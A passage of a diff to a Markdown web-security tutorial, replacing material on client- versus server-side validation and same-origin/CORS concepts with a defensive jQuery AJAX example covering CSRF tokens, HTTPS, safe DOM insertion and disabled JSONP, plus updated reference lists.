+        // ✅ BEST PRACTICE 2: Configure CSRF headers globally
+        $.ajaxSetup({
+            beforeSend: function(xhr, settings) {
+                if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
+                    xhr.setRequestHeader("X-CSRF-Token", csrfToken);
+                }
+            }
+        });
+
+        function csrfSafeMethod(method) {
+            return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
         }
-      });
-    });
-  </script>
+
+        // ✅ BEST PRACTICE 3: Use HTTPS
+        var apiUrl = "https://api.example.com/data";
+
+        // ✅ BEST PRACTICE 4: Make the request
+        $.ajax({
+            url: apiUrl,
+            type: "POST",
+            dataType: "json",
+            data: { name: "John" }
+        })
+        .done(function(data) {
+            // ✅ BEST PRACTICE 5: Use .text() for untrusted data
+            $("#output").text(data.message);
+        })
+        .fail(function(jqXHR) {
+            if (jqXHR.status === 403) {
+                $("#output").text("Access denied");
+            } else if (jqXHR.status === 0) {
+                $("#output").text("Request blocked (CORS or mixed content)");
+            } else {
+                $("#output").text("Error: " + jqXHR.status);
+            }
+        });
+
+        // ✅ BEST PRACTICE 6: Disable JSONP for untrusted URLs
+        $.ajaxSetup({ jsonp: false });
+
+        // ✅ BEST PRACTICE 7: Server-side headers (for reference)
+        // Content-Security-Policy: script-src 'self' https://trusted.cdn.com
+        // Strict-Transport-Security: max-age=31536000; includeSubDomains
+        // Access-Control-Allow-Origin: https://yourdomain.com
+        // Access-Control-Allow-Credentials: true
+    </script>
 </body>
 </html>
 ```
 
-**Expected Output**
-- Entering an age below 18 shows "You must be 18 or older" and blocks submission.
-- **However**, an attacker can:
-  1. Disable JavaScript in the browser.
-  2. Use browser DevTools to change the validation logic.
-  3. Send a direct POST request with `curl` or Postman.
+**Expected Output:**
+The AJAX request includes the CSRF token and uses HTTPS. The response data is displayed safely using `.text()`. If the request fails due to authorization or CORS, an appropriate message is shown.
 
-**Why This Output Occurs**
-Client-side validation runs in the browser. The attacker controls the browser, so they can bypass it entirely .
-
----
-
-**Example 2: Server-Side Validation (Pseudocode)**
-
-```javascript
-// Server-side (Node.js/Express concept)
-app.post("/api/submit", function (req, res) {
-  var age = parseInt(req.body.age, 10);
-
-  // Step 1: Server-side validation — cannot be bypassed
-  if (isNaN(age) || age < 18) {
-    return res.status(400).json({
-      error: "You must be 18 or older."
-    });
-  }
-
-  // Step 2: Only process if valid
-  res.json({ success: true, message: "Application accepted." });
-});
-```
-
-**Expected Output**
-- Even if the client bypasses validation, the server rejects invalid data with a 400 error.
-- The server is the authoritative source of validation.
-
-**Why This Output Occurs**
-Server-side validation runs in an environment the attacker cannot control, making it the only reliable security check .
+**Why This Code Produces That Result:**
+The code applies multiple security best practices: CSRF token inclusion, HTTPS enforcement, safe DOM insertion with `.text()`, JSONP disabling, and error handling for common security-related status codes. These layered defenses protect against CSRF, XSS, JSONP injection, and insecure transport.
 
 ### Real-World Cases
 
-- **SQL Injection**: Client-side validation can be bypassed; server must use parameterized queries.
-- **Price Manipulation**: E-commerce sites must validate prices server-side; clients can alter prices in the DOM.
-- **Privilege Escalation**: Server must check user roles; hiding UI elements is not authorization.
-- **File Uploads**: Server must validate file types and sizes; clients can send anything.
-
-### References
-
-- ScienceDirect — Client-Side Validation Limitations – https://www.sciencedirect.com/topics/computer-science/side-validation
-- Microsoft Learn — ASP.NET Validation Controls – https://learn.microsoft.com/en-us/archive/blogs/edunhill/asp-net-validation
-- Patent US6915454 — Server-Side Validation Objects – https://patentimages.storage.googleapis.com/04/7c/65/a1cebc10b39c3d/US6915454.pdf
-
----
-
-## Summary Comparison Table
-
-| Concept | Primary Mechanism | Browser-Enforced? | Server-Configurable? | Key Vulnerability |
-|---|---|---|---|---|
-| **Same-Origin Policy** | Origin matching | Yes | No | Subdomain trust |
-| **CORS** | Response headers | Yes | Yes | Misconfiguration |
-| **CSRF** | Synchronizer tokens | No | Yes | Cookie auth |
-| **JWT Bearer Auth** | `Authorization` header | No | Yes | XSS (token theft) |
-| **Server Validation** | Server-side logic | No | Yes | Logic flaws |
-
----
-
-## Important Notes on Version-Specific Behaviour and Limitations
-
-1. **CORS `Authorization` Header**: The `Authorization` header must always be explicitly listed in `Access-Control-Allow-Headers`; wildcards do not apply to it .
-2. **SameSite Cookies**: Provide defense-in-depth for CSRF but do not replace tokens; SameSite does not protect against client-side CSRF .
-3. **JWT Storage**: `localStorage` is CSRF-resistant but XSS-vulnerable; `HttpOnly` cookies are XSS-resistant but CSRF-vulnerable .
-4. **Preflight Caching**: Preflight results can be cached via `Access-Control-Max-Age`, but failures are not retried on the same connection .
-5. **Simple Requests**: Avoid preflight by using only safelisted headers and content types (GET/HEAD/POST, `Accept`, `Content-Type`, `Content-Language`) .
-6. **Client-Side Validation**: Never rely on it for security; always validate on the server .
+- **Enterprise Applications:** Following OWASP guidelines for secure AJAX communication.
+- **Financial Services:** Protecting sensitive transactions with CSRF tokens and HTTPS.
+- **Healthcare Applications:** Ensuring HIPAA compliance with secure data transmission.
+- **E-Commerce Platforms:** Protecting user data and payment information.
 
 ---
 
 ## References
 
-- MDN Web Docs — Same-origin policy – https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
-- web.dev — Same-origin policy – https://web.dev/articles/same-origin-policy
-- WHATWG HTML Standard — Origins – https://html.spec.whatwg.org/multipage/browsers.html#origins
-- MDN Web Docs — CORS Guide – https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
-- MDN Web Docs — Access-Control-Allow-Headers – https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Headers
-- MDN Web Docs — Access-Control-Request-Headers – https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Request-Headers
-- MDN Web Docs — CORS Preflight Errors – https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS/Errors/CORSPreflightDidNotSucceed
-- OWASP — CSRF Prevention Cheat Sheet – https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
-- Microsoft Learn — Prevent CSRF attacks in ASP.NET Core – https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery
-- Microsoft Learn — CSRF (Chinese) – https://learn.microsoft.com/zh-cn/aspnet/core/security/anti-request-forgery
-- Stack Overflow — Attaching Bearer Token in jQuery AJAX – https://stackoverflow.com/revisions/ea016f41-cd55-452c-b04d-72a0220e9d31/view-source
-- Stack Overflow — beforeSend for Bearer Token – https://stackoverflow.com/revisions/b1c35d36-12f7-4d14-8fbc-fb5bda59664a/view-source
-- ScienceDirect — Client-Side Validation Limitations – https://www.sciencedirect.com/topics/computer-science/side-validation
-- Microsoft Learn — ASP.NET Validation Controls – https://learn.microsoft.com/en-us/archive/blogs/edunhill/asp-net-validation
-- Patent US6915454 — Server-Side Validation Objects – https://patentimages.storage.googleapis.com/04/7c/65/a1cebc10b39c3d/US6915454.pdf
-- IETF Datatracker — OAuth 2.0 for Browser-Based Applications – https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/22/
+- OWASP Web Frontend Security Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Web_Frontend_Security_Cheat_Sheet.html
+- OWASP AJAX Security Cheat Sheet - https://wiki.owasp.org/index.php/AJAX_Security_Cheat_Sheet
+- OWASP Cross-Site Request Forgery Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+- OWASP DOM-based XSS Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
+- MDN Web Docs — Cross-Origin Resource Sharing (CORS) - https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
+- MDN Web Docs — Content Security Policy (CSP) - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+- MDN Web Docs — HTTP Strict Transport Security (HSTS) - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+- CVE-2015-9251: jQuery Cross-Domain AJAX XSS - https://safeguard.sh/resources/blog/cve-2015-9251-jquery-cross-domain-ajax-xss-explained
+- CVE-2019-11358: jQuery Prototype Pollution - https://safeguard.sh/resources/blog/jquery-1-10-2-vulnerabilities-should-you-worry
+- CVE-2026-49264: Unsafe JSONP Callback Injection - https://vulnerability.circl.lu/vuln/BREW-TWARC-CVE-2026-49264
+- jQuery API Documentation — jQuery.ajax() - https://api.jquery.com/jquery.ajax/
+- jQuery API Documentation — jQuery.ajaxSetup() - https://api.jquery.com/jquery.ajaxSetup/
+- BOWPHP — CSRF Protection Documentation - https://bowphp.com/docs/csrf/
+- Kendo UI — CORS Data Fetching - https://www.telerik.com/kendo-jquery-ui/documentation/framework/datasource/cors
+- SAP — HTTPS Best Practices - https://help.sap.com/doc/837c0d21848d4727919446d4dda976e6/6.0/en-US/submodules/cross-application-guides/topics/master_security_guide_c4r/https.html
+- Apache Kylin — Use RESTful API in JavaScript - https://kylin.incubator.apache.org/zh-Hans/docs/4.0.4/howto/howto_use_restapi_in_js/
+- CISA NICCS — Creating Secure JavaScript and jQuery Code - https://niccs.cisa.gov/training/catalog/cmdctrl/creating-secure-javascript-and-jquery-code
